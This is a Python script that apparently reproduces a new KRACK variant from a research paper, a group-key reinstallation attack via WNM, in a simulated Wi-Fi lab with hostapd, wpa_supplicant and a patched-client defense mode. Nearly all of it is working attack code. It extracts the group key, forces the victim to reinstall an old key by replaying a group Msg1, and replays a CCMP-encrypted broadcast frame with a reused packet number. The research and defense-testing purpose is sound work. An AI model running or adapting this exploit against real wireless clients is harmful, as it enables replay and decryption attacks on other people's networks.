#!/usr/bin/env python3
"""
Full software implementation: KRACK attack based on WNM (Multicast-Reuse KRACK)
Corresponding to the paper's "a new KRACK attack using WNM".

Attack flow:
  Step 0: Environment setup, start hostapd + wpa_supplicant(-d), wait for association
  Step 1: Obtain initial GTK_0, construct CCMP encrypted broadcast frame and send it
  Step 2: Retrieve GTK_0 via GET_GTK and save it for later replay
  Step 3: Advance 4 key slots (RENEW_GTK ×2 + RESEND_GROUP_M1 ×2)
  Step 4: Replay old GTK_0 Msg1 via SEND_GROUP_M1_WITH_GTK → trigger ReinstallGTK
          Evidence: wpa_supplicant -d logs + nl80211 kernel key state
  Step 5: Replay CCMP encrypted broadcast frame (encrypted with GTK_0, PN=z+1)

Usage (on VM, requires sudo, run under krackattack/ directory):
  cd ~/krack_experiment/krackattacks-scripts/krackattack
  source venv/bin/activate
  sudo -E python3 ~/wireless_sec_exp/scripts/figure6_attack.py
  sudo -E python3 ~/wireless_sec_exp/scripts/figure6_attack.py --defense
"""

import os
import sys
import time
import struct
import socket
import select
import argparse
import subprocess
import logging
import threading
import re

USER_HOME  = "/home/yh3h636"
KRACK_DIR  = os.path.realpath(os.path.join(USER_HOME,
             "krack_experiment/krackattacks-scripts/krackattack"))

if not os.path.isdir(KRACK_DIR):
    print(f"[ERROR] Cannot find krackattack directory: {KRACK_DIR}")
    sys.exit(1)

os.chdir(KRACK_DIR)
sys.path.insert(0, KRACK_DIR)

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11CCMP, Dot11QoS, Dot11Beacon
    from wpaspy import Ctrl
    from libwifi.crypto import encrypt_ccmp, decrypt_ccmp
    from libwifi.wifi import *
except ImportError as e:
    print(f"[ERROR] Import failed: {e}")
    print("Please activate virtual environment first: source venv/bin/activate")
    sys.exit(1)

# ── Configuration ─────────────────────────────────────────────────────────────
AP_MAC       = "02:00:00:00:00:00"
CLIENT_MAC   = "02:00:00:00:01:00"
BCAST_MAC    = "ff:ff:ff:ff:ff:ff"
MON_IFACE    = "hwsim0"
AP_IFACE     = "wlan0"
CLIENT_IFACE = "wlan1"
HOSTAPD_BIN  = os.path.join(os.path.dirname(KRACK_DIR), "hostapd", "hostapd")
HOSTAPD_CONF = os.path.join(KRACK_DIR, "hostapd.conf")
WPA_SYSTEM   = "/usr/sbin/wpa_supplicant"
WPA_PATCHED  = os.path.join(os.path.dirname(KRACK_DIR),
                             "wpa_supplicant", "wpa_supplicant")
VICTIM_CONF  = "/tmp/victim.conf"
WPA_DEBUG_LOG = "/tmp/wpa_debug_fig6.log"
LOG_DIR      = os.path.join(USER_HOME, "wireless_sec_exp/logs")
CAP_DIR      = os.path.join(USER_HOME, "wireless_sec_exp/captures")

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO,
                    format="[%(asctime)s] %(message)s",
                    datefmt="%H:%M:%S")
log = logging.getLogger(__name__)


def run_cmd(cmd, check=False):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and r.returncode != 0:
        log.warning(f"Command failed: {cmd}\n{r.stderr[:200]}")
    return r.stdout.strip()


def hostapd_cmd(ctrl, cmd):
    while ctrl.pending():
        ctrl.recv()
    rval = ctrl.request(cmd)
    if "UNKNOWN COMMAND" in rval:
        log.error(f"hostapd does not recognize command: {cmd}")
        return None
    log.debug(f"hostapd {cmd!r} -> {rval.strip()!r}")
    return rval.strip()


def reset_interfaces():
    run_cmd("pkill -f hostapd", check=False)
    run_cmd("pkill -f wpa_supplicant", check=False)
    run_cmd("pkill -f tcpdump", check=False)
    time.sleep(1)
    for iface in [AP_IFACE, CLIENT_IFACE]:
        run_cmd(f"ip link set {iface} down")
        run_cmd(f"iw dev {iface} set type managed")
        run_cmd(f"ip link set {iface} up")
    run_cmd("ip link set hwsim0 up")
    time.sleep(1)
    log.info("Interface reset completed")


def start_hostapd():
    os.makedirs(os.path.join(KRACK_DIR, "hostapd_ctrl"), exist_ok=True)
    proc = subprocess.Popen(
        [HOSTAPD_BIN, HOSTAPD_CONF],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        cwd=KRACK_DIR)
    time.sleep(2)
    if proc.poll() is not None:
        log.error("hostapd startup failed")
        sys.exit(1)
    ctrl_path = os.path.join(KRACK_DIR, "hostapd_ctrl", AP_IFACE)
    deadline = time.time() + 5
    while not os.path.exists(ctrl_path) and time.time() < deadline:
        time.sleep(0.5)
    if not os.path.exists(ctrl_path):
        log.error(f"hostapd control interface not found: {ctrl_path}")
        proc.terminate()
        sys.exit(1)
    ctrl = Ctrl("hostapd_ctrl/" + AP_IFACE)
    ctrl.attach()
    log.info(f"hostapd started (PID {proc.pid})")
    return proc, ctrl


def start_victim(wpa_bin, debug=True):
    """Start wpa_supplicant with debug logging (-K shows keys)"""
    if debug:
        cmd = (f"{wpa_bin} -i {CLIENT_IFACE} -c {VICTIM_CONF} "
               f"-D nl80211 -d -K 2>&1 | tee {WPA_DEBUG_LOG}")
        proc = subprocess.Popen(cmd, shell=True,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    else:
        proc = subprocess.Popen(
            [wpa_bin, "-i", CLIENT_IFACE, "-c", VICTIM_CONF, "-D", "nl80211"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    if proc.poll() is not None:
        log.error("wpa_supplicant startup failed")
        sys.exit(1)
    log.info(f"wpa_supplicant started (PID {proc.pid}), log: {WPA_DEBUG_LOG}")
    return proc


def wait_for_association(ctrl, timeout=20):
    log.info("Waiting for client association...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        out = hostapd_cmd(ctrl, "STA-FIRST") or ""
        if CLIENT_MAC.lower() in out.lower():
            log.info(f"Client associated: {CLIENT_MAC}")
            return True
        time.sleep(1)
    log.warning("Client did not associate within timeout")
    return False


# ── nl80211 GTK state read ────────────────────────────────────────────────────
def nl80211_get_gtk(iface):
    try:
        from pyroute2 import NL80211
        from pyroute2.netlink.nl80211 import nl80211cmd
        nl = NL80211()
        ifindex = socket.if_nametoindex(iface)
        for keyidx in [1, 2]:
            try:
                msg = nl.get_key(ifindex=ifindex, key_idx=keyidx,
                                 mac=None, pairwise=False)
                if msg:
                    for m in msg:
                        attrs = dict(m['attrs'])
                        if 'NL80211_ATTR_KEY_DATA' in attrs:
                            gtk_bytes = attrs['NL80211_ATTR_KEY_DATA']
                            return keyidx, gtk_bytes.hex()
            except Exception:
                pass
        nl.close()
    except Exception as e:
        log.debug(f"nl80211 GET_KEY failed: {e}")
    return None


def nl80211_get_gtk_via_iw(iface):
    try:
        with open(WPA_DEBUG_LOG, 'r', errors='replace') as f:
            content = f.read()
        matches = re.findall(
            r'WPA: GTK - hexdump\(len=\d+\):\s*((?:[0-9a-f]{2}\s*)+)',
            content, re.IGNORECASE)
        if matches:
            gtk_hex = matches[-1].replace(' ', '').strip()
            return gtk_hex
    except Exception as e:
        log.debug(f"GTK parsing failed: {e}")
    return None


# ── CCMP broadcast frame construction ─────────────────────────────────────────
def build_broadcast_arp_plaintext(ap_mac, bcast_mac):
    dot11 = Dot11(
        type=2,
        subtype=0,
        FCfield="from-DS",
        addr1=bcast_mac,
        addr2=ap_mac,
        addr3=bcast_mac,
        SC=0
    )
    llc_snap = LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0, code=0x0806)
    arp = ARP(op=1,
              hwsrc=ap_mac,
              psrc="192.168.100.1",
              hwdst="00:00:00:00:00:00",
              pdst="192.168.100.2")
    return dot11 / llc_snap / arp


def encrypt_broadcast_frame(gtk_hex, pn, ap_mac, bcast_mac, keyid=1):
    gtk = bytes.fromhex(gtk_hex)
    plaintext_frame = build_broadcast_arp_plaintext(ap_mac, bcast_mac)
    encrypted = encrypt_ccmp(plaintext_frame, gtk, pn, keyid=keyid)
    log.info(f"  CCMP encryption completed: GTK={gtk_hex[:8]}... PN={pn} KeyID={keyid}")
    log.info(f"  Frame length: {len(raw(encrypted))} bytes")
    return encrypted


def send_encrypted_broadcast(gtk_hex, pn, ap_mac, bcast_mac, iface, keyid=1):
    frame = encrypt_broadcast_frame(gtk_hex, pn, ap_mac, bcast_mac, keyid)
    sendp(frame, iface=iface, verbose=False)
    log.info(f"  [Broadcast frame] Sent encrypted ARP (PN={pn})")
    return frame


# ── wpa_supplicant log analysis ───────────────────────────────────────────────
def parse_gtk_installs(log_path):
    installs = []
    try:
        with open(log_path, 'r', errors='replace') as f:
            lines = f.readlines()

        gtk_val = None
        for i, line in enumerate(lines):
            m = re.search(
                r'WPA: Group Key - hexdump\(len=\d+\):\s*((?:[0-9a-f]{2}\s*)+)',
                line, re.IGNORECASE)
            if m:
                gtk_val = m.group(1).replace(' ', '').strip()

            m2 = re.search(
                r'nl80211: KEY_DATA - hexdump\(len=\d+\):\s*((?:[0-9a-f]{2}\s*)+)',
                line, re.IGNORECASE)
            if m2:
                pass
            
            if 'Installing GTK to the driver' in line:
                m3 = re.search(r'keyidx=(\d+)', line)
                keyidx = int(m3.group(1)) if m3 else -1
                installs.append({
                    'gtk': gtk_val,
                    'keyidx': keyidx,
                    'line': i + 1,
                    'text': line.strip()
                })
    except Exception as e:
        log.warning(f"log parsing failed: {e}")
    return installs


def check_reinstall_evidence(log_path):
    installs = parse_gtk_installs(log_path)
    log.info(f"\n[Evidence analysis] GTK install records (total {len(installs)}):")
    for i, rec in enumerate(installs):
        log.info(f"  [{i+1}] line{rec['line']}: keyidx={rec['keyidx']} "
                 f"GTK={rec['gtk'][:16] if rec['gtk'] else 'N/A'}...")

    if len(installs) >= 2:
        gtk_values = [r['gtk'] for r in installs if r['gtk']]
        seen = {}
        for i, gtk in enumerate(gtk_values):
            if gtk in seen:
                log.warning(f"\n[!!!] ReinstallGTK evidence confirmed!")
                log.warning(f"  GTK {gtk[:16]}... appears multiple times")
                log.warning("  → Victim supplicant reinstalled old GTK")
                return True, installs
            seen[gtk] = i
    return False, installs


# ── Main attack flow ──────────────────────────────────────────────────────────
def run_figure6_attack(defense_mode=False):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    mode_str  = "defense" if defense_mode else "attack"
    pcap_file = os.path.join(CAP_DIR, f"fig6_{mode_str}_{timestamp}.pcapng")
    log_file  = os.path.join(LOG_DIR,  f"fig6_{mode_str}_{timestamp}.log")
    os.makedirs(CAP_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)

    wpa_bin = WPA_PATCHED if defense_mode else WPA_SYSTEM
    log.info(f"=== Figure 6 WNM KRACK Attack ({'Defense mode' if defense_mode else 'Attack mode'}) ===")
    log.info(f"wpa_supplicant: {wpa_bin}")

    # ── Step 0: Environment setup ─────────────────────────────────────────────
    log.info("\n━━━ Step 0: Environment setup ━━━")
    reset_interfaces()

    open(WPA_DEBUG_LOG, 'w').close()

    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", MON_IFACE, "-w", pcap_file,
         "ether proto 0x888e or (type data subtype data) or arp"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)

    hostapd_proc, ctrl = start_hostapd()
    victim_proc = start_victim(wpa_bin, debug=True)

    if not wait_for_association(ctrl):
        log.error("Client not associated, exiting")
        for p in [tcpdump, hostapd_proc, victim_proc]:
            p.terminate()
        return "FAILED"

    time.sleep(2)

    # ── Step 1 & 2: Obtain GTK_0 and send initial frame ──────────────────────
    log.info("\n━━━ Step 1-2: Obtain GTK_0 and send initial CCMP encrypted broadcast frame ━━━")

    gtk0_hex = hostapd_cmd(ctrl, "GET_GTK")
    if not gtk0_hex:
        log.error("GET_GTK failed, exiting")
        for p in [tcpdump, hostapd_proc, victim_proc]:
            p.terminate()
        return "FAILED"
    gtk0_hex = gtk0_hex.strip()
    log.info(f"  GTK_0 = {gtk0_hex}")

    INITIAL_PN = 1
    log.info(f"  Sending initial broadcast ARP (GTK_0 encrypted, PN={INITIAL_PN})")
    send_encrypted_broadcast(
        gtk0_hex, INITIAL_PN, AP_MAC, BCAST_MAC, AP_IFACE, keyid=1)
    time.sleep(1)

    # ── Step 3: Advance key slots ────────────────────────────────────────────
    log.info("\n━━━ Step 3: Advance 4 key slots (GTK_0 removed from all slots) ━━━")

    log.info("  RENEW_GTK × 2 (advance gtk1/gtk2)")
    for i in range(2):
        r = hostapd_cmd(ctrl, "RENEW_GTK")
        log.info(f"    GTK rotation {i+1}/2: {r}")
        time.sleep(1.5)

    log.info("  RESEND_GROUP_M1 maxrsc × 2 (advance wnm1/wnm2)")
    for i in range(2):
        r = hostapd_cmd(ctrl, f"RESEND_GROUP_M1 {CLIENT_MAC} maxrsc")
        log.info(f"    WNM cycle {i+1}/2: {r}")
        time.sleep(1.5)

    log.info(f"  GTK_0 ({gtk0_hex[:8]}...) no longer in supplicant key slots")
    time.sleep(1)

    # ── Step 4: Replay old GTK Msg1 ─────────────────────────────────────────
    log.info("\n━━━ Step 4: Replay old GTK_0 Msg1 → trigger ReinstallGTK ━━━")
    log.info(f"  Sending SEND_GROUP_M1_WITH_GTK {CLIENT_MAC} {gtk0_hex}")

    r = hostapd_cmd(ctrl, f"SEND_GROUP_M1_WITH_GTK {CLIENT_MAC} {gtk0_hex}")
    log.info(f"  hostapd response: {r}")
    time.sleep(3)

    log.info("\n  [nl80211 kernel key state]")
    nl_result = nl80211_get_gtk(CLIENT_IFACE)
    if nl_result:
        keyidx, gtk_kernel = nl_result
        log.info(f"  Kernel GTK: keyidx={keyidx} GTK={gtk_kernel}")
        if gtk_kernel == gtk0_hex:
            log.warning("  [!!!] Kernel GTK matches GTK_0 → ReinstallGTK occurred!")
        else:
            log.info("  Kernel GTK differs from GTK_0 (updated GTK active)")
    else:
        log.info("  nl80211 unavailable, using log analysis")

    log.info("\n  [wpa_supplicant log evidence]")
    reinstall_found, installs = check_reinstall_evidence(WPA_DEBUG_LOG)

    # ── Step 5: Replay broadcast frame ───────────────────────────────────────
    log.info("\n━━━ Step 5: Replay broadcast frame (PN reuse test) ━━━")
    log.info(f"  Replaying ARP (GTK_0 encrypted, PN={INITIAL_PN})")
    send_encrypted_broadcast(
        gtk0_hex, INITIAL_PN, AP_MAC, BCAST_MAC, AP_IFACE, keyid=1)
    time.sleep(1)

    # ── Results ───────────────────────────────────────────────────────────────
    log.info("\n━━━ Result summary ━━━")
    if reinstall_found:
        result = "REINSTALL_CONFIRMED"
        log.warning("[!!!] ReinstallGTK confirmed: victim reinstalled old GTK")
        log.warning("      → New attack successful: key slot window bypass works")
        log.warning("      → Step 5 replay may decrypt old broadcast frames")
    elif defense_mode:
        result = "DEFENDED"
        log.info("[+] Defense mode: patch prevents GTK reinstallation")
    else:
        result = "PROTOCOL_LAYER_ONLY"
        log.info("[~] Protocol-level evidence only, no reinstall detected")

    for p in [tcpdump, hostapd_proc, victim_proc]:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(1)

    with open(log_file, "w") as f:
        f.write("Figure 6 WNM KRACK Attack Experiment\n")
        f.write(f"Mode: {mode_str}\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"wpa_supplicant: {wpa_bin}\n\n")
        f.write(f"GTK_0: {gtk0_hex}\n")
        f.write(f"Initial PN: {INITIAL_PN}\n\n")
        f.write(f"GTK install records (total {len(installs)}):\n")
        for i, rec in enumerate(installs):
            f.write(f"  [{i+1}] line{rec['line']}: keyidx={rec['keyidx']} "
                    f"GTK={rec['gtk'][:32] if rec['gtk'] else 'N/A'}\n")
        f.write(f"\nResult: {result}\n")
        f.write(f"Pcap: {pcap_file}\n")
        f.write(f"WPA debug log: {WPA_DEBUG_LOG}\n")

    log.info(f"\nPCAP: {pcap_file}")
    log.info(f"Log: {log_file}")
    log.info(f"WPA debug log: {WPA_DEBUG_LOG}")
    log.info(f"Result: {result}")
    return result


def main():
    parser = argparse.ArgumentParser(
        description="Figure 6 WNM KRACK attack: Multicast-Reuse KRACK full implementation")
    parser.add_argument("--defense", action="store_true",
                        help="Use patched wpa_supplicant (defense mode)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[ERROR] Root privileges required, run with sudo")
        sys.exit(1)

    run_figure6_attack(defense_mode=args.defense)


if __name__ == "__main__":
    main()